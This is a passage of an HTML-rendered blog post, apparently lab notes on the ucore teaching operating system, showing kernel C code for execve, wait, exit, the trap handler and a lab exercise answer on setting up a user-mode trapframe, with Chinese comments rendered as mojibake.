class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-comment">//ä¾‹è¡Œæ£€æŸ¥ä»¥åŠæ ¡æ­£åç§°é•¿åº¦</span><br>    <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)name, len, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;<br>        len = PROC_NAME_LEN;<br>    &#125;<br><span class="hljs-comment">//ä»nameåœ°å€ä¸Šå¤åˆ¶åç§°å­—ç¬¦ä¸²</span><br>    <span class="hljs-keyword">char</span> local_name[PROC_NAME_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memset</span>(local_name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(local_name));<br>    <span class="hljs-built_in">memcpy</span>(local_name, name, len);<br><span class="hljs-comment">//å¦‚æœcurrent-&gt;mmä¸ä¸ºNULL, è¯´æ˜ä¸ºç”¨æˆ·è¿›ç¨‹, æ¸…ç©ºä¸€ä¸‹mm(åŒ…æ‹¬vmaé“¾è¡¨,é¡µç›®å½•è¡¨,ä»¥åŠmmè‡ªèº«)</span><br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-comment">//è§£æELFæ–‡ä»¶ä»¥åŠå»ºç«‹mmå†…å®¹</span><br>    <span class="hljs-keyword">if</span> ((ret = load_icode(binary, size)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> execve_exit;<span class="hljs-comment">//å‡ºé”™åˆ™é€€å‡º</span><br>    &#125;<br>    set_proc_name(current, local_name);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>execve_exit:<br>    do_exit(ret);<br>    panic(<span class="hljs-string">&quot;already exit: %e.\n&quot;</span>, ret);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè§£æELFæ–‡ä»¶æ‰æ˜¯å¤§å¤´. ä»£ç åœ¨<strong>ç»ƒä¹ 1</strong>æˆ–è€…ç›´æ¥çœ‹æºç .</p><p><strong>load_icode</strong>å‡½æ•°çš„ä¸»è¦å·¥ä½œå°±æ˜¯ç»™ç”¨æˆ·è¿›ç¨‹å»ºç«‹ä¸€ä¸ªèƒ½å¤Ÿè®©ç”¨æˆ·è¿›ç¨‹æ­£å¸¸è¿è¡Œçš„ç”¨æˆ·ç¯å¢ƒã€‚æ­¤å‡½æ•°æœ‰ä¸€ç™¾å¤šè¡Œï¼Œå®Œæˆäº†å¦‚ä¸‹é‡è¦å·¥ä½œï¼š</p><ol><li>è°ƒç”¨mm_createå‡½æ•°æ¥ç”³è¯·è¿›ç¨‹çš„å†…å­˜ç®¡ç†æ•°æ®ç»“æ„mmæ‰€éœ€å†…å­˜ç©ºé—´ï¼Œå¹¶å¯¹mmè¿›è¡Œåˆå§‹åŒ–ï¼›</li><li>è°ƒç”¨setup_pgdiræ¥ç”³è¯·ä¸€ä¸ªé¡µç›®å½•è¡¨æ‰€éœ€çš„ä¸€ä¸ªé¡µå¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¹¶æŠŠæè¿°ucoreå†…æ ¸è™šç©ºé—´æ˜ å°„çš„å†…æ ¸é¡µè¡¨ï¼ˆboot_pgdiræ‰€æŒ‡ï¼‰çš„å†…å®¹æ‹·è´åˆ°æ­¤æ–°ç›®å½•è¡¨ä¸­ï¼Œæœ€åè®©mm-&gt;pgdiræŒ‡å‘æ­¤é¡µç›®å½•è¡¨ï¼Œè¿™å°±æ˜¯è¿›ç¨‹æ–°çš„é¡µç›®å½•è¡¨äº†ï¼Œä¸”èƒ½å¤Ÿæ­£ç¡®æ˜ å°„å†…æ ¸è™šç©ºé—´ï¼›</li><li>æ ¹æ®åº”ç”¨ç¨‹åºæ‰§è¡Œç çš„èµ·å§‹ä½ç½®æ¥è§£ææ­¤ELFæ ¼å¼çš„æ‰§è¡Œç¨‹åºï¼Œå¹¶è°ƒç”¨mm_mapå‡½æ•°æ ¹æ®ELFæ ¼å¼çš„æ‰§è¡Œç¨‹åºè¯´æ˜çš„å„ä¸ªæ®µï¼ˆä»£ç æ®µã€æ•°æ®æ®µã€BSSæ®µç­‰ï¼‰çš„èµ·å§‹ä½ç½®å’Œå¤§å°å»ºç«‹å¯¹åº”çš„vmaç»“æ„ï¼Œå¹¶æŠŠvmaæ’å…¥åˆ°mmç»“æ„ä¸­ï¼Œä»è€Œè¡¨æ˜äº†ç”¨æˆ·è¿›ç¨‹çš„åˆæ³•ç”¨æˆ·æ€è™šæ‹Ÿåœ°å€ç©ºé—´ï¼›</li><li>è°ƒç”¨æ ¹æ®æ‰§è¡Œç¨‹åºå„ä¸ªæ®µçš„å¤§å°åˆ†é…ç‰©ç†å†…å­˜ç©ºé—´ï¼Œå¹¶æ ¹æ®æ‰§è¡Œç¨‹åºå„ä¸ªæ®µçš„èµ·å§‹ä½ç½®ç¡®å®šè™šæ‹Ÿåœ°å€ï¼Œå¹¶åœ¨é¡µè¡¨ä¸­å»ºç«‹å¥½ç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€çš„æ˜ å°„å…³ç³»ï¼Œç„¶åæŠŠæ‰§è¡Œç¨‹åºå„ä¸ªæ®µçš„å†…å®¹æ‹·è´åˆ°ç›¸åº”çš„å†…æ ¸è™šæ‹Ÿåœ°å€ä¸­ï¼Œè‡³æ­¤åº”ç”¨ç¨‹åºæ‰§è¡Œç å’Œæ•°æ®å·²ç»æ ¹æ®ç¼–è¯‘æ—¶è®¾å®šåœ°å€æ”¾ç½®åˆ°è™šæ‹Ÿå†…å­˜ä¸­äº†ï¼›</li><li>éœ€è¦ç»™ç”¨æˆ·è¿›ç¨‹è®¾ç½®ç”¨æˆ·æ ˆï¼Œä¸ºæ­¤è°ƒç”¨mm_mmapå‡½æ•°å»ºç«‹ç”¨æˆ·æ ˆçš„vmaç»“æ„ï¼Œæ˜ç¡®ç”¨æˆ·æ ˆçš„ä½ç½®åœ¨ç”¨æˆ·è™šç©ºé—´çš„é¡¶ç«¯ï¼Œå¤§å°ä¸º256ä¸ªé¡µï¼Œå³1MBï¼Œå¹¶åˆ†é…ä¸€å®šæ•°é‡çš„ç‰©ç†å†…å­˜ä¸”å»ºç«‹å¥½æ ˆçš„è™šåœ°å€&lt;â€“&gt;ç‰©ç†åœ°å€æ˜ å°„å…³ç³»ï¼›</li><li>è‡³æ­¤,è¿›ç¨‹å†…çš„å†…å­˜ç®¡ç†vmaå’Œmmæ•°æ®ç»“æ„å·²ç»å»ºç«‹å®Œæˆï¼Œäºæ˜¯æŠŠmm-&gt;pgdirèµ‹å€¼åˆ°cr3å¯„å­˜å™¨ä¸­ï¼Œå³æ›´æ–°äº†ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œæ­¤æ—¶çš„initprocå·²ç»è¢«helloçš„ä»£ç å’Œæ•°æ®è¦†ç›–ï¼Œæˆä¸ºäº†ç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ï¼Œä½†æ­¤æ—¶è¿™ä¸ªç”¨æˆ·è¿›ç¨‹çš„æ‰§è¡Œç°åœºè¿˜æ²¡å»ºç«‹å¥½ï¼›</li><li>å…ˆæ¸…ç©ºè¿›ç¨‹çš„ä¸­æ–­å¸§ï¼Œå†é‡æ–°è®¾ç½®è¿›ç¨‹çš„ä¸­æ–­å¸§ï¼Œä½¿å¾—åœ¨æ‰§è¡Œä¸­æ–­è¿”å›æŒ‡ä»¤â€œiretâ€åï¼Œèƒ½å¤Ÿè®©CPUè½¬åˆ°ç”¨æˆ·æ€ç‰¹æƒçº§ï¼Œå¹¶å›åˆ°ç”¨æˆ·æ€å†…å­˜ç©ºé—´ï¼Œä½¿ç”¨ç”¨æˆ·æ€çš„ä»£ç æ®µã€æ•°æ®æ®µå’Œå †æ ˆï¼Œä¸”èƒ½å¤Ÿè·³è½¬åˆ°ç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œï¼Œå¹¶ç¡®ä¿åœ¨ç”¨æˆ·æ€èƒ½å¤Ÿå“åº”ä¸­æ–­ï¼›</li></ol><p>è‡³æ­¤ï¼Œç”¨æˆ·è¿›ç¨‹çš„ç”¨æˆ·ç¯å¢ƒå·²ç»æ­å»ºå®Œæ¯•ã€‚æ­¤æ—¶initprocå°†æŒ‰äº§ç”Ÿç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°è°ƒç”¨è·¯å¾„åŸè·¯è¿”å›ï¼Œæ‰§è¡Œä¸­æ–­è¿”å›æŒ‡ä»¤â€œiretâ€ï¼ˆä½äºtrapentry.Sçš„æœ€åä¸€å¥ï¼‰åï¼Œå°†åˆ‡æ¢åˆ°ç”¨æˆ·è¿›ç¨‹helloçš„ç¬¬ä¸€æ¡è¯­å¥ä½ç½®_startå¤„ï¼ˆä½äºuser/libs/initcode.Sçš„ç¬¬ä¸‰å¥ï¼‰å¼€å§‹æ‰§è¡Œã€‚</p><h4 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_wait - wait one OR any children to become PROC_ZOMBIE state, and free memory space of kernel stack</span><br><span class="hljs-comment">//         - proc struct of this child.</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> only after do_wait function, all resources of the child proces are free.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pid, <span class="hljs-keyword">int</span> *code_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//ä¾‹è¡Œæ£€æŸ¥</span><br>        <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)code_store, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-keyword">return</span> -E_INVAL;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">bool</span> intr_flag, haskid;<br>repeat:<br>    haskid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//ä¸ç­‰äºé›¶æ„å‘³ç€è¦åœ¨hash_listä¸­å¯»æ‰¾ç‰¹å®špidçš„å­ç¨‹åº</span><br>        proc = find_proc(pid);<br>        <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//æŸ¥æ‰¾ä»»æ„ä¸€ä¸ªä¸ºZOMBIEçš„å­ç¨‹åº</span><br>        proc = current-&gt;cptr;<br>        <span class="hljs-keyword">for</span> (; proc != <span class="hljs-literal">NULL</span>; proc = proc-&gt;optr) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (haskid) &#123;<span class="hljs-comment">//å­˜åœ¨å­ç¨‹åº, ä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªæ˜¯ZOMBIE, è€Œä¸”å½“å‰æ˜¯çˆ¶è¿›ç¨‹åœ¨æ‰§è¡Œ, æ‰€ä»¥è°ƒç”¨switch()æ¥</span><br>        <span class="hljs-comment">//åˆ‡æ¢åˆ°å­è¿›ç¨‹æ‰§è¡Œ, å¹¶ä¸”è®¾ç½®ä¸€ä¸‹çˆ¶è¿›ç¨‹ä¸ºSLEEPçŠ¶æ€, waitåŸå› æ˜¯for child</span><br>        current-&gt;state = PROC_SLEEPING;<br>        current-&gt;wait_state = WT_CHILD;<br>        schedule();<br>        <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//æ€ä¹ˆè°ƒç”¨äº†do_exit()?????</span><br>            do_exit(-E_KILLED);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> repeat;<span class="hljs-comment">//å­è¿›ç¨‹(åº”è¯¥)æ‰§è¡Œå®Œäº†, é‡æ–°æŸ¥æ‰¾</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_BAD_PROC;<span class="hljs-comment">//æ²¡æœ‰å­ç¨‹åºçš„è¯......</span><br><br>found:<br>    <span class="hljs-keyword">if</span> (proc == idleproc || proc == initproc) &#123;<span class="hljs-comment">//ä¸å¯èƒ½æ˜¯ä»»ä½•è¿›ç¨‹çš„å­è¿›ç¨‹</span><br>        panic(<span class="hljs-string">&quot;wait idleproc or initproc.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//å¦‚æœæä¾›äº†å­˜æ”¾exit_codeçš„å˜é‡, åˆ™å­˜å…¥</span><br>        *code_store = proc-&gt;exit_code;<br>    &#125;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//å¯¹è¿™ç§é“¾è¡¨çš„æ“ä½œè¦å±è”½ä¸­æ–­</span><br>        unhash_proc(proc);<br>        remove_links(proc);<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-comment">//é‡Šæ”¾å­è¿›ç¨‹å ç”¨èµ„æº</span><br>    put_kstack(proc);<br>    kfree(proc);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="exit"><a href="#exit" class="headerlink" title="exit():"></a>exit():</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_exit - called by sys_exit</span><br><span class="hljs-comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span><br><span class="hljs-comment">//   2. set process&#x27; state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span><br><span class="hljs-comment">//   3. call scheduler to switch to other process</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> error_code)</span> </span>&#123;<br>    <span class="hljs-comment">//ä¸èƒ½é€€å‡ºçš„ä¸¤ä¸ªå†…æ ¸è¿›ç¨‹</span><br>    <span class="hljs-keyword">if</span> (current == idleproc) &#123;<br>        panic(<span class="hljs-string">&quot;idleproc exit.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current == initproc) &#123;<br>        panic(<span class="hljs-string">&quot;initproc exit.\n&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//å¦‚æœcurrent-&gt;mmä¸ä¸ºNULL, è¯´æ˜ä¸ºç”¨æˆ·è¿›ç¨‹, æ¸…ç©ºä¸€ä¸‹mm(åŒ…æ‹¬vmaé“¾è¡¨,é¡µç›®å½•è¡¨,ä»¥åŠmmè‡ªèº«)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    current-&gt;state = PROC_ZOMBIE;<br>    current-&gt;exit_code = error_code;<br><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-comment">//å¦‚æœçˆ¶è¿›ç¨‹å› ä¸ºWT_CHILDç¡çœ , åˆ™å”¤é†’çˆ¶è¿›ç¨‹</span><br>        proc = current-&gt;parent;<br>        <span class="hljs-keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;<br>            wakeup_proc(proc);<br>        &#125;<br>        <span class="hljs-keyword">while</span> (current-&gt;cptr != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//å½“å‰è¿›ç¨‹æœ‰å­è¿›ç¨‹</span><br>            proc = current-&gt;cptr;<br>            current-&gt;cptr = proc-&gt;optr;<br>   <span class="hljs-comment">//ä»¥ä¸‹å‡ è¡ŒæŠŠprocä»currentçš„cpträ¸Šæ’å…¥åˆ°initprocçš„cptrç­‰å…³ç³»æŒ‡é’ˆä¸­</span><br>            proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//æŠŠcurrentçš„å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹è®¾ç½®ä¸ºinitproc</span><br>                initproc-&gt;cptr-&gt;yptr = proc;<br>            &#125;<br>            proc-&gt;parent = initproc;<br>            initproc-&gt;cptr = proc;<br>            <span class="hljs-comment">//å¦‚æœinitprocå› ä¸ºWT_CHILDç¡çœ , åˆ™å”¤é†’initproc</span><br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;<br>                    wakeup_proc(initproc);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br>    schedule();<br>    panic(<span class="hljs-string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);<br></code></pre></div></td></tr></table></figure><h2 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1-2"><a href="#ç»ƒä¹ 1-2" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><blockquote><p>è¡¥å……load_icode()çš„å®ç°</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//(6) setup trapframe for user environment</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br><span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<span class="hljs-comment">//æ¸…ç©ºtf</span><br><span class="hljs-comment">/* LAB5:EXERCISE1 YOUR CODE</span><br><span class="hljs-comment"> * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span><br><span class="hljs-comment"> * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span><br><span class="hljs-comment"> *          tf_cs should be USER_CS segment (see memlayout.h)</span><br><span class="hljs-comment"> *          tf_ds=tf_es=tf_ss should be USER_DS segment</span><br><span class="hljs-comment"> *          tf_esp should be the top addr of user stack (USTACKTOP)</span><br><span class="hljs-comment"> *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span><br><span class="hljs-comment"> *          tf_eflags should be set to enable computer to produce Interrupt</span><br><span class="hljs-comment"> */</span><br>tf-&gt;tf_cs = USER_CS;<br><span class="hljs-comment">//ç­”æ¡ˆä¸­å¥½åƒæ²¡æœ‰tf_fs?è™½ç„¶ä¸é‡è¦ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸åŠ ä¸Š</span><br>tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_fs = tf-&gt;tf_ss = USER_DS;<br>tf-&gt;tf_esp = USTACKTOP;<br>tf-&gt;tf_eflags |= FL_IF;<br>tf-&gt;tf_eip= elf-&gt;e_entry;<br>ret = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>è¯·åœ¨å®éªŒæŠ¥å‘Šä¸­æè¿°å½“åˆ›å»ºä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹å¹¶åŠ è½½äº†åº”ç”¨ç¨‹åºåï¼ŒCPUæ˜¯å¦‚ä½•è®©è¿™ä¸ªåº”ç”¨ç¨‹åºæœ€ç»ˆåœ¨ç”¨æˆ·æ€æ‰§è¡Œèµ·æ¥çš„ã€‚å³è¿™ä¸ªç”¨æˆ·æ€è¿›ç¨‹è¢«ucoreé€‰æ‹©å ç”¨CPUæ‰§è¡Œï¼ˆRUNNINGæ€ï¼‰åˆ°å…·ä½“æ‰§è¡Œåº”ç”¨ç¨‹åºç¬¬ä¸€æ¡æŒ‡ä»¤çš„æ•´ä¸ªç»è¿‡ã€‚</p></blockquote><ul><li><p>å½“ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åºæ‰§è¡Œ<code>sys_execve</code>æ—¶ï¼Œè¯¥ç¨‹åºå°†è§¦å‘<code>0x80</code>ä¸­æ–­ï¼Œå¹¶è¿›å…¥ä¸­æ–­å¤„ç†ä¾‹ç¨‹ã€‚ä¸Lab1ç±»ä¼¼ï¼Œä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£ä»£ç ä¼šä¿å­˜<code>trapframe</code>ä½œä¸ºè·³è½¬å›ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ä½†ä¸lab1ä»£ç æ‰€ä¸åŒçš„æ˜¯ï¼Œlab5ä¸­çš„<code>trap</code>å‡½æ•°å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>)<br>        trap_dispatch(tf);<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å› ä¸ºå¯èƒ½ä¼šå‘ç”ŸåµŒå¥—ä¸­æ–­çš„æƒ…å†µï¼Œæ‰€ä»¥ä¿å­˜ä¸Šä¸€æ¬¡çš„trapframe</span><br>        struct trapframe *otf = current-&gt;tf;<br>        <span class="hljs-comment">// æ³¨æ„è¿™ä¸€æ­¥ï¼Œè®¾ç½®å½“å‰processçš„æ ˆå¸§ä¸ºå½“å‰ä¸­æ–­æ ˆå¸§</span><br>        current-&gt;tf = tf;<br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br>        trap_dispatch(tf);<br>        current-&gt;tf = otf;<br><br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING)<br>                do_exit(-E_KILLED);<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched)<br>                schedule();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>ç”±äº<code>trap</code>å‡½æ•°çš„è®¾è®¡ï¼Œåœ¨<code>do_execve</code>ä¸­ï¼Œæ­¤æ—¶çš„<code>current-&gt;tf</code>ä¿å­˜çš„å°±æ˜¯ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡ã€‚</p></li><li><p>å› æ­¤åœ¨æ‰§è¡Œ<code>load_icode</code>å‡½æ•°æ—¶ï¼Œç¨‹åºåªä¼šä¿®æ”¹<code>current-&gt;trapframe</code>ã€‚å› ä¸ºå½“ä¸­æ–­å¤„ç†ç¨‹åºè¿”å›æ—¶ï¼ŒCPUæ‰€åŠ è½½çš„ä¸Šä¸‹æ–‡å°±æ˜¯<code>current-&gt;trapframe</code>ã€‚</p></li></ul><h3 id="ç»ƒä¹ 2-2"><a href="#ç»ƒä¹ 2-2" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><blockquote><p>do_fork()-&gt;dum_mmap()-&gt;copy_range()çš„å®ç°</p></blockquote><p>æŒ‰ç…§page 